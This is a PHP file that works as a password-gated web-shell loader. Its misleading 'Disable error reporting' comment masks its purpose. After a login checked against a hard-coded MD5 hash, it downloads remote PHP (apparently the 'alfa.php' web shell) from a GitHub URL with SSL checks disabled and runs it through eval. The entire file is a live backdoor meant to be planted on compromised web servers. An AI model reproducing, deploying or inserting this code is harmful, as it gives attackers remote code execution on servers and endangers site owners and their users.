<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['SAP'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}
// Check if the password is submitted and correct
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '21232f297a57a5a743894a0e4a801fc3';
    //'ee54742a64ac6be74c68382ddca6d929'; // Replace this with your MD5 hashed password
    if (md5($entered_password) === $hashed_password) {
        // Password is correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['SAP'] = 'janco'; // Replace this with your cookie data
    } else {
        // Password is incorrect
        echo "Incorrect password. Please try again.";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/izunasec/bot2/main/alfa.php');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
 
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>SELEBEW DI MARI</title>
        <style>
            body {
                background-image: url('https://imgur.com/xiLIl4S.jpg');
                background-size: cover; 
                background-position: center;
                background-attachment: fixed; /
                height: 100vh; 
                margin: 0;
                color: white; 
            }
        </style>
    </head>
    <body>
        <center>
            <img src="https://imgur.com/hkk9Sjc.png" />
            <form method="POST" action="">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password">
                <input type="submit" value="GASKEN">
            </form>
        </center>
    </body>
    </html>
    <?php
}
?>